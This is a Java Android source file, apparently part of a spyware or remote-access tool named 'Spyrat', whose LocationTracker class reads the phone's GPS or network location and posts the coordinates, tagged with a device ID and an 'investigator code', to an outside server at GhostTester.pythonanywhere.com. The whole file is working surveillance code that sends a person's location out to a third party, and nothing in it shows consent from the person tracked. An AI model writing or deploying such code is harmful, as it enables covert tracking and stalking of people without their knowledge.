package com.spyrat.investigation;

import android.content.Context;
import android.location.Location;
import android.location.LocationManager;
import android.util.Log;
import org.json.JSONObject;

public class LocationTracker {
    private static final String TAG = "SpyratLocation";

    public static JSONObject getCurrentLocation(Context context) {
        try {
            LocationManager locationManager = (LocationManager) context.getSystemService(Context.LOCATION_SERVICE);
            
            // Try GPS first
            Location location = locationManager.getLastKnownLocation(LocationManager.GPS_PROVIDER);
            if (location == null) {
                // Try network
                location = locationManager.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
            }

            if (location != null) {
                JSONObject locationData = new JSONObject();
                locationData.put("latitude", location.getLatitude());
                locationData.put("longitude", location.getLongitude());
                locationData.put("accuracy", location.getAccuracy());
                locationData.put("timestamp", System.currentTimeMillis());
                locationData.put("provider", location.getProvider());
                
                Log.d(TAG, "📍 Location captured: " + location.getLatitude() + ", " + location.getLongitude());
                return locationData;
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Location error: " + e.getMessage());
        }
        return null;
    }

    public static void sendCurrentLocation(Context context, String deviceId, String investigatorCode) {
        try {
            JSONObject locationData = getCurrentLocation(context);
            if (locationData != null) {
                JSONObject postData = new JSONObject();
                postData.put("device_id", deviceId);
                postData.put("investigator_code", investigatorCode);
                postData.put("data_type", "location");
                postData.put("data_content", locationData);

                NetworkManager.sendPost("https://GhostTester.pythonanywhere.com/api/investigator/data", postData.toString());
            }
        } catch (Exception e) {
            Log.e(TAG, "❌ Location send error: " + e.getMessage());
        }
    }
}
